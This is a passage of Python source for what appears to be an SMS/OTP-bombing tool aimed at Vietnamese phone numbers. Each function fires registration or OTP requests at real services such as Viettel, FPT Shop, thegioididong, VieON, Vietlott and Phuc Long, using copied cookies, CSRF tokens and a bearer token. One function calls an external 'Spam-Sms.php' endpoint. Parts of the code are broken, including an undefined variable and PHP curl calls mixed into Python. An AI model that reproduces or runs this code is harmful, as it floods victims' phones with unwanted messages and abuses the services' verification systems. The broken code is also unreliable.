  # 'cookie': '_ga=GA1.2.1651025600.1692762277; _gid=GA1.2.215967924.1692762277; _ga_9B0FYPSWN9=GS1.2.1692769369.2.0.1692769369.60.0.0; serverChoice=Server-IPv2',
  'origin': 'https://xuandungshortcuts.000webhostapp.com',
  'referer': 'https://xuandungshortcuts.000webhostapp.com/',
  'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  data = {
    'phone': phone,
  'ten_server': 'Server-IPv2',
  'key': 'modmobile',
}

  response = requests.post('https://xuandungshortcuts.000webhostapp.com/', cookies=cookies, headers=headers, data=data)
def apiv5(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)        
def concac(phone):
	response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
def mhl(phone):
	response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
def moca(phone):
    response = requests.get(f"https://iamtris.x10.mx/Spam-Sms.php?key=ducknha@123*&phone={phone}")
def gbay(phone):
    json_data = {'phone_number': phone,'hash': random_string(40),}
    requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()
 
def tgdd(phone):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
        '_ce.s': 'v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940',
        '_ce.clock_event': '1',
        'SvID': 'beline2686|ZHFg6|ZHFg5',
        '_ce.clock_data': '-113%2C14.225.211.123%2C1',
        'cebsp_': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '5MoF_IoMgcKATLRi4lIvjOVPQrd',
        'lhc_per': 'vid|eadd7b088636140f774e',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_Personal=%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE; _gid=GA1.2.2106570071.1685151972; _ga_TLRZMSX5ME=GS1.1.1685151972.1.0.1685151972.60.0.0; _ga=GA1.1.2004811826.1685151972; _fbp=fb.1.1685151972814.1550382232; cebs=1; _ce.s=v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940; _ce.clock_event=1; SvID=beline2686|ZHFg6|ZHFg5; _ce.clock_data=-113%2C14.225.211.123%2C1; cebsp_=1; _tt_enable_cookie=1; _ttp=5MoF_IoMgcKATLRi4lIvjOVPQrd; lhc_per=vid|eadd7b088636140f774e',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)    

def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

def BIBABO(phone):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    payload = {
        "phone": phone,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }

    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)

def SWIFT247(phone):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, json=postdata)         

def KILO(phone):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54",
        "app-version": "1",
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "i18next-language": "vi",
        "api-version": "2",
        "platform": "SELLER_WEB",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://seller.kilo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    email = random.choice(['a', 'b', 'c', 'd', 'e', 'f']) + "@gmail.com"  # Email đăng ký tài khoản
    data = json.dumps({"phone": phone, "email": email})
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)

def GAPO(phone):
    Headers = [
        "Host: api.gapo.vn",
        "Content-Length: 31",
        "Content-Type: application/json",
        "Sec-Ch-Ua-Mobile: ?1",
        "Authorization: Bearer",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform: \"Android\"",
        "Accept: */*",
        "Origin: https://www.gapo.vn",
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://www.gapo.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ]
    Data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + phone[1:11],
        "otp_type": 0
    }
    Options = {
        "http": {
            "header": "\r\n".join(Headers),
            "method": "POST",
            "content": json.dumps(Data),
            "ignore_errors": True
        }
    }
    Context = ssl._create_unverified_context()
    Result = urllib.request.urlopen("https://api.gapo.vn/auth/v2.0/signup", data=json.dumps(Data).encode('utf-8'), context=Context)
def cac(phone):
   requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
###
def PHUCLONG(phone):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
  
    data = {
        "phoneNumber": phone,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', data=datason, headers=headers)

def VIETLOTT(phone):
    headers = {
        "Host": "api-mobi.vietlottsms.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "ClientCallAPI": "EMB",
        "deviceId": "",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "/",
        "partnerChannel": "WEB",
        "Identify-Device-Token": "",
        "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://vietlott-sms.vn",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://vietlott-sms.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {'phoneNumber': phone}
    datason = json.dumps(data)
    
    url = 'https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber'
    
    response = requests.post(url, data=datason, headers=headers)

def CONCUNG(phone):
  headers = {
    "Host": "concung.com",
    "content-length": "121",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept": "/",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://concung.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://concung.com/dang-nhap.html",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    "cookie": "gaBBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0"
  }
  postData = {
    "ajax": "1",
    "classAjax": "AjaxLogin",
    "methodAjax": "sendOtpLogin",
    "customerphone": phone,
    "idcustomer": "0",
    "momoapp": "0",
    "back": "khach-hang.html"
  }
  ch = curlinit()
  curlsetopt(ch, CURLOPTURL, "https://concung.com/ajax.html")
  curlsetopt(ch, CURLOPTRETURNTRANSFER, 1)
  curlsetopt(ch, CURLOPTHEADER, 1)
